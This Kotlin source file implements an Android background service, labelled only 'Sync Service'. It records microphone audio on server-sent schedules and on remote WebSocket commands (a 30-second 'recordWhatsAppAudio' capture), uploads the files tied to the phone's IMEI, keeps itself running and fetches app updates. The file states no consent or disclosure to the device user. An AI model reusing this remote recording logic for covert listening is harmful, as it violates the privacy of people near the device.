package com.kiper.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.kiper.app.network.NetworkMonitor
import com.kiper.app.worker.ServiceMonitorWorker
import com.kiper.core.data.source.remote.WebSocketManager
import com.kiper.core.domain.model.AudioRecording
import com.kiper.core.domain.model.ScheduleCalendar
import com.kiper.core.domain.model.ScheduleResponse
import com.kiper.core.domain.model.WebSocketEventResponse
import com.kiper.core.domain.model.isAfterScheduleToday
import com.kiper.core.domain.model.isIntoSchedule
import com.kiper.core.framework.worker.AudioRecordWorker
import com.kiper.core.util.Constants
import com.kiper.core.util.Constants.CHANNEL_ID
import com.kiper.core.util.Constants.EVENT_TYPE_AUDIO
import com.kiper.core.util.Constants.EVENT_TYPE_PROCESS_AUDIO
import com.kiper.core.util.Constants.EVENT_TYPE_SCHEDULE
import com.kiper.core.util.Constants.NOTIFICATION_ID
import com.kiper.core.util.Constants.TAG
import com.kiper.core.util.Constants.TAG_FUTURE_WORKER
import com.kiper.core.util.Constants.TAG_WORKER
import com.kiper.core.util.FileUtil
import com.kiper.core.util.parseTime
import com.kiper.core.util.timeString
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.launch
import java.io.File
import java.util.Calendar
import java.util.Date
import java.util.concurrent.TimeUnit
import javax.inject.Inject

@AndroidEntryPoint
class SyncService : Service() {

    @Inject
    lateinit var webSocketClient: WebSocketManager

    @Inject
    lateinit var workManager: WorkManager

    @Inject
    lateinit var syncViewModel: SyncViewModel

    @Inject
    lateinit var networkMonitor: NetworkMonitor

    private var networkCheckRunnable: Runnable? = null

    private val job = Job()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private val handler = Handler(Looper.getMainLooper())

    private var isRecording30s = false

    private var currentSchedules: List<ScheduleResponse> = emptyList()

    private val closeAppReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.d("SyncService", "SyncService - intent: ${intent?.action}")
            if (intent?.action == "com.kiper.app.CLOSE_APP_ACTION") {
                val packageName = intent.getStringExtra("packageName")
                packageName?.let {
                    networkMonitor.clear()
                    networkMonitor.checkNetworkAndSendIntent()
                    startPeriodicNetworkCheck()
                }
            }
        }
    }


    override fun onCreate() {
        super.onCreate()
        setUpObservers()
        startForeground(NOTIFICATION_ID, createNotification())
        initWebSocket()
        fetchDeviceSchedules()
        scheduleServiceMonitor(applicationContext)
        registerReceiver(closeAppReceiver, IntentFilter("com.kiper.app.CLOSE_APP_ACTION"))
    }

    private fun setUpObservers() {
        scope.launch {
            syncViewModel.recordings.collect { recordings ->
                Log.d("Recordings", "Recordings: $recordings")
                recordings?.let {
                    val filePaths = emptyList<File>().toMutableList()
                    it.forEach { recording ->
                        filePaths += findFilesWithBaseName(
                            applicationContext.filesDir, recording.fileName
                        )
                    }
                    uploadAudioFiles(files = filePaths, eventType = EVENT_TYPE_PROCESS_AUDIO)
                }
            }
        }
        scope.launch {
            syncViewModel.fileDeleted.collect { fileNames ->
                fileNames.forEach { fileName ->
                    if (fileName != null) {
                        deleteFilesWithBaseName(fileName)
                    }
                }
            }
        }
        scope.launch {
            syncViewModel.schedules.collect { schedules ->
                schedules?.let { scheduleRecordings(it) }
            }
        }
        scope.launch {
            syncViewModel.uploadResult.collect { result ->
                if (result == true) {
                    fetchDeviceSchedules()
                }
            }
        }

    }

    private fun scheduleServiceMonitor(context: Context) {
        val workRequest = PeriodicWorkRequestBuilder<ServiceMonitorWorker>(
            15, TimeUnit.MINUTES
        ).build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "ServiceMonitorWork",
            ExistingPeriodicWorkPolicy.REPLACE,
            workRequest
        )
    }


    private fun deleteFilesWithBaseName(baseName: String) {
        val directory = applicationContext.filesDir
        val matchingFiles = findFilesWithBaseName(directory, baseName)
        Log.d("DeleteFiles", "Files to delete: $matchingFiles")
        matchingFiles.forEach { file ->
            if (file.delete()) {
                println("Deleted file: ${file.name}")
            } else {
                println("Failed to delete file: ${file.name}")
            }
        }
    }

    private fun findFilesWithBaseName(directory: File, baseName: String): List<File> {
        return directory.listFiles { file ->
            file.isFile && file.name.startsWith(baseName) && FileUtil.isFileCreatedToday(file.path)
        }?.toList() ?: emptyList()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun fetchDeviceSchedules() {
        val deviceId = getDeviceId()
        scope.launch {
            syncViewModel.resetDataBase()
            syncViewModel.fetchDeviceSchedules(deviceId)
        }
    }

    private fun initWebSocket() {
        webSocketClient.start(getDeviceId())
        webSocketClient.callback = object : WebSocketManager.WebSocketCallback {
            override fun onMessage(message: WebSocketEventResponse) {
                when (message.event) {
                    EVENT_TYPE_SCHEDULE -> {
                        fetchDeviceSchedules()
                    }
                    EVENT_TYPE_AUDIO -> {
                        recordWhatsAppAudio()
                    }
                }
            }
        }
    }

    private fun recordWhatsAppAudio() {
        scope.launch {
            workManager.cancelAllWorkByTag(TAG_WORKER)
            workManager.cancelAllWorkByTag(TAG_FUTURE_WORKER)
            val now = Calendar.getInstance()
            val endTime = Calendar.getInstance().apply {
                add(Calendar.SECOND, 30)
            }
            val duration = endTime.timeInMillis - now.timeInMillis
            scheduleImmediateRecording(
                endTime = endTime,
                schedule = ScheduleResponse(now.timeString, endTime.timeString),
                eventType = EVENT_TYPE_AUDIO
            )
            isRecording30s = true
            delay(duration + 4000L)
            isRecording30s = false
            val fileName = findFilesWithBaseName(
                applicationContext.filesDir,
                "${getDeviceId()}_${now.timeString}_${endTime.timeString}"
            ).firstOrNull()
            uploadAudioFiles(listOf(fileName), EVENT_TYPE_AUDIO)
        }
    }

    private fun getRecordingsForDay() {
        scope.launch {
            Log.d("AudioRecordWorker", "$currentSchedules")
            val isOutSchedule = currentSchedules.all { !it.isIntoSchedule() }
            Log.i("AudioRecordWorker", "$isOutSchedule")

            if (isOutSchedule && !isRecording30s) {
                syncViewModel.getRecordingsForDay(startOfDay = Calendar.getInstance().apply {
                    set(Calendar.HOUR_OF_DAY, 0)
                    set(Calendar.MINUTE, 0)
                    set(Calendar.SECOND, 0)
                }.timeInMillis, endOfDay = Calendar.getInstance().apply {
                    set(Calendar.HOUR_OF_DAY, 23)
                    set(Calendar.MINUTE, 59)
                    set(Calendar.SECOND, 59)
                }.timeInMillis
                )
            }
        }
    }

    private fun uploadAudioFiles(files: List<File?>, eventType: String) {
        scope.launch {
            val deviceId = getDeviceId()
            val filePaths = files.mapNotNull { it?.path }
            if (filePaths.isEmpty()) return@launch

            try {
                syncViewModel.uploadAudio(filePaths = filePaths,
                    deviceId = deviceId,
                    eventType = eventType,
                    fileNames = files.map { it?.name ?: "" })
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading audio files", e)
            }
        }
    }

    private fun scheduleRecordings(schedules: List<ScheduleResponse>) {
        workManager.cancelAllWorkByTag(TAG_WORKER)
        workManager.cancelAllWorkByTag(TAG_FUTURE_WORKER)
        currentSchedules = schedules
        Log.d("scheduleRecordings", "$schedules")

        val now = Calendar.getInstance()

        schedules.forEach { schedule ->
            val typeAdjust = schedule.isAfterScheduleToday()
            val scheduleCalendar = getAdjustDayToWork(schedule = schedule, typeAdjust = typeAdjust)

            val duration =
                scheduleCalendar.endTime.timeInMillis - scheduleCalendar.startTime.timeInMillis
            if (now.after(scheduleCalendar.startTime) && now.before(scheduleCalendar.endTime)) {
                scheduleImmediateRecording(
                    endTime = scheduleCalendar.endTime,
                    schedule = schedule,
                    eventType = EVENT_TYPE_PROCESS_AUDIO
                )
            } else if (now.before(scheduleCalendar.startTime)) {
                scheduleFutureRecording(
                    scheduleCalendar.startTime,
                    duration = duration,
                    schedule = schedule,
                    tagWorker = TAG_WORKER
                )
            }
        }
    }

    private fun scheduleImmediateRecording(
        endTime: Calendar,
        schedule: ScheduleResponse,
        eventType: String,
    ) {
        val now = Calendar.getInstance()
        val remainingDuration = endTime.timeInMillis - now.timeInMillis
        scheduleRecording(
            delay = 0,
            duration = remainingDuration,
            schedule = schedule,
            tagWorker = TAG_WORKER,
            eventType = eventType
        )
    }

    private fun scheduleFutureRecording(
        startTime: Calendar,
        duration: Long,
        schedule: ScheduleResponse,
        tagWorker: String,
        eventType: String = EVENT_TYPE_PROCESS_AUDIO,
    ) {
        val delay = startTime.timeInMillis - Calendar.getInstance().timeInMillis
        scheduleRecording(
            delay = delay,
            duration = duration,
            schedule = schedule,
            tagWorker = tagWorker,
            eventType = eventType
        )
    }

    private fun getAdjustDayToWork(
        schedule: ScheduleResponse,
        typeAdjust: Boolean
    ): ScheduleCalendar {
        return if (typeAdjust) {
            adjustToTomorrow(schedule.startTime.parseTime, schedule.endTime.parseTime)
        } else {
            adjustToToday(schedule.startTime.parseTime, schedule.endTime.parseTime)
        }
    }

    private fun adjustToToday(startTime: Calendar, endTime: Calendar): ScheduleCalendar {
        val today = Calendar.getInstance()
        val start = startTime.apply {
            set(Calendar.YEAR, today.get(Calendar.YEAR))
            set(Calendar.MONTH, today.get(Calendar.MONTH))
            set(Calendar.DAY_OF_MONTH, today.get(Calendar.DAY_OF_MONTH))
        }
        val end = endTime.apply {
            set(Calendar.YEAR, today.get(Calendar.YEAR))
            set(Calendar.MONTH, today.get(Calendar.MONTH))
            set(Calendar.DAY_OF_MONTH, today.get(Calendar.DAY_OF_MONTH))
        }
        return ScheduleCalendar(start, end)
    }

    private fun adjustToTomorrow(startTime: Calendar, endTime: Calendar): ScheduleCalendar {
        val tomorrow = Calendar.getInstance().apply {
            add(Calendar.DAY_OF_MONTH, 1)
        }
        val start = startTime.apply {
            set(Calendar.YEAR, tomorrow.get(Calendar.YEAR))
            set(Calendar.MONTH, tomorrow.get(Calendar.MONTH))
            set(Calendar.DAY_OF_MONTH, tomorrow.get(Calendar.DAY_OF_MONTH))
        }
        val end = endTime.apply {
            set(Calendar.YEAR, tomorrow.get(Calendar.YEAR))
            set(Calendar.MONTH, tomorrow.get(Calendar.MONTH))
            set(Calendar.DAY_OF_MONTH, tomorrow.get(Calendar.DAY_OF_MONTH))
        }
        return ScheduleCalendar(start, end)
    }

    private fun scheduleRecording(
        delay: Long,
        duration: Long,
        schedule: ScheduleResponse,
        tagWorker: String,
        eventType: String,
    ) {

        val baseName = "${getDeviceId()}_${schedule.startTime}_${schedule.endTime}"
        val data = workDataOf(
            "recordingName" to baseName, "duration" to duration, "eventType" to eventType
        )
        val workRequest = OneTimeWorkRequestBuilder<AudioRecordWorker>().setInitialDelay(
            delay, TimeUnit.MILLISECONDS
        ).setInputData(data).addTag(tagWorker).build()

        syncViewModel.saveRecording(
            AudioRecording(
                fileName = baseName,
                filePath = applicationContext.filesDir.absolutePath,
                startTime = Date(),
                duration = duration
            )
        )

        workManager.enqueue(workRequest)
    }

    private fun getDeviceId(): String {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return telephonyManager.deviceId.substring(4, 14)
    }

    private fun createNotification(): Notification {
        val notification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle("Sync Service")
            .setContentText("Running in the background")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE).build()

        val notificationManager =
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel =
                NotificationChannel(CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW)
            notificationManager.createNotificationChannel(channel)
        }
        return notification
    }

    private fun startPeriodicNetworkCheck() {
        networkCheckRunnable?.let { handler.removeCallbacks(it) }

        networkCheckRunnable = object : Runnable {
            override fun run() {
                networkMonitor.clear()
                networkMonitor.checkNetworkAndSendIntent()
                handler.postDelayed(this, Constants.PERIODIC_CHECK_NETWORK_DELAY)
            }
        }

        handler.postDelayed(networkCheckRunnable!!, Constants.PERIODIC_CHECK)

        networkMonitor.listener = object : NetworkMonitor.ResultNetwork {
            override fun onInternetAccessResult(isConnected: Boolean, event: String) {
                if (isConnected && event == EVENT_TYPE_PROCESS_AUDIO) {
                    Log.i(TAG, "Internet access available. Initiating upload. service")
                    getRecordingsForDay()
                    updateAndDownloadVersion()
                } else {
                    if (isConnected && event == EVENT_TYPE_AUDIO) {
                        Log.i(TAG, "Internet access.")
                    } else {
                        Log.i(TAG, "No Internet access.")
                    }
                }
                webSocketClient.hasActiveConnection()
            }
        }
    }
    private fun updateAndDownloadVersion() {
        scope.launch {
            syncViewModel.checkAndDownloadVersion()
        }
    }
    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null


}
